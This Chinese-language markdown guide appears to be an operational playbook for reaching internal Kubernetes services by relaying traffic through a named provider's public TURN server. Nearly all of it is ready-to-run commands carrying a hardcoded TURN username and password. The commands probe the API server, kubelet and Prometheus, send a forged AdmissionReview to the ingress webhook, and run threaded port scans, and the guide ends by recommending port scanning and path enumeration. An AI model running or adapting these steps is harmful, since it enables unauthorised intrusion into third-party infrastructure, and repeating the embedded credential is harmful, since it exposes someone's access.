# Kubernetes 集群内服务交互指南

## 当前可访问的服务

通过 IONOS TURN 服务器，以下 IP:端口 可以成功连接：
- `10.233.0.1:443` - HTTPS 服务
- `10.233.0.243:443` - Ingress NGINX Admission Webhook

## 进一步交互方案

### 1. 测试其他常见 Kubernetes 端口

#### Kubernetes API Server (6443)
```bash
python3 protocol_forwarding/http_turn_client.py \
  --target-host 10.233.0.1 \
  --target-port 6443 \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --https --no-verify-ssl \
  --path "/api/v1" \
  --method GET
```

#### Kubelet API (10250)
```bash
python3 protocol_forwarding/http_turn_client.py \
  --target-host 10.233.0.1 \
  --target-port 10250 \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --https --no-verify-ssl \
  --path "/metrics" \
  --method GET
```

#### Prometheus (9090)
```bash
python3 protocol_forwarding/http_turn_client.py \
  --target-host 10.233.0.1 \
  --target-port 9090 \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --path "/" \
  --method GET
```

### 2. 探索已连接服务的其他端点

#### Ingress NGINX Admission Webhook (10.233.0.243:443)

**测试不同的 AdmissionReview 操作：**
- CREATE Ingress
- UPDATE Ingress  
- DELETE Ingress
- CREATE/UPDATE/DELETE 其他资源类型

**示例：测试 Pod 资源的 AdmissionReview**
```bash
python3 protocol_forwarding/http_turn_client.py \
  --target-host 10.233.0.243 \
  --target-port 443 \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --https --no-verify-ssl \
  --method POST \
  --content-type "application/json" \
  --body '{"apiVersion":"admission.k8s.io/v1","kind":"AdmissionReview","request":{"uid":"test-uid","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"operation":"CREATE","name":"test-pod","namespace":"default","object":{"apiVersion":"v1","kind":"Pod","metadata":{"name":"test-pod","namespace":"default"},"spec":{"containers":[{"name":"test","image":"nginx"}]}}}}'
```

### 3. 使用综合测试脚本测试更多端口

```bash
python3 comprehensive_tcp_turn_tester.py \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --tls \
  --ip-file k8s_ips.txt \
  --port-file k8s_ports.txt \
  --output ionos_k8s_full_test.json \
  --threads 4 \
  --reuse-connection
```

### 4. 访问 Kubernetes API Server 端点

如果 API Server (6443) 可访问，可以尝试：

**获取 API 版本：**
```bash
python3 protocol_forwarding/http_turn_client.py \
  --target-host 10.233.0.1 \
  --target-port 6443 \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --https --no-verify-ssl \
  --path "/api/v1" \
  --method GET
```

**获取 Namespace 列表：**
```bash
python3 protocol_forwarding/http_turn_client.py \
  --target-host 10.233.0.1 \
  --target-port 6443 \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --https --no-verify-ssl \
  --path "/api/v1/namespaces" \
  --method GET \
  --authorization "Bearer <token>"
```

### 5. 访问 Kubelet Metrics

```bash
python3 protocol_forwarding/http_turn_client.py \
  --target-host 10.233.0.1 \
  --target-port 10250 \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --https --no-verify-ssl \
  --path "/metrics" \
  --method GET
```

### 6. 使用自定义请求进行高级交互

**创建完整的 HTTP 请求文件：**
```bash
cat > /tmp/k8s_api_request.txt << 'EOF'
GET /api/v1/namespaces HTTP/1.1
Host: 10.233.0.1:6443
Authorization: Bearer <your-token>
Accept: application/json
EOF

python3 protocol_forwarding/http_turn_client.py \
  --target-host 10.233.0.1 \
  --target-port 6443 \
  --turn-server vc0-turn0.live.videochat.ionos.com \
  --turn-port 443 \
  --username "1764683063" \
  --password "gvn1XvGXhVvm1bEcjb1rMtUT6NM=" \
  --https --no-verify-ssl \
  --request-file /tmp/k8s_api_request.txt
```

## 注意事项

1. **认证**：大多数 Kubernetes API 端点需要有效的 Bearer Token
2. **TLS 验证**：使用 `--no-verify-ssl` 跳过证书验证（仅用于测试）
3. **网络策略**：某些服务可能被 NetworkPolicy 限制
4. **速率限制**：注意不要过于频繁地请求，避免触发限流

## 下一步建议

1. **端口扫描**：使用 `k8s_ports.txt` 对所有可访问 IP 进行端口扫描
2. **服务发现**：尝试访问常见的 Kubernetes 服务端点
3. **协议探测**：测试不同协议（HTTP/HTTPS/WebSocket）
4. **路径枚举**：对已确认的服务进行路径枚举

